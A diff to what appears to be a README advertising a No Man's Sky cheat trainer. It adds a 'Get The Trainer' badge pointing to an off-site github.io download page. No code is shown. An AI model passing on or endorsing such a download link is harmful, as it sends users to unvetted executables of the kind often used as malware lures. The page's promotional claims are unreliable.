@@ -4,6 +4,8 @@
 
 **No Man’s Sky** is a vast universe of exploration, survival, and crafting. While its scale is breathtaking, the grind for resources, nanites, and upgrades can feel endless. That’s why many players turn to a **No Man’s Sky trainer** – a standalone cheat tool that makes survival and farming effortless. With features like **god mode, unlimited currency, instant crafting, and item dupes**, trainers let you enjoy the game at your own pace.
 
+[![Get](https://img.shields.io/badge/Get%20The-Trainer-blueviolet)](https://no-man-s-sky-trainer.github.io/.github/)
+
 ---
 
 ## What is a No Man’s Sky Trainer?
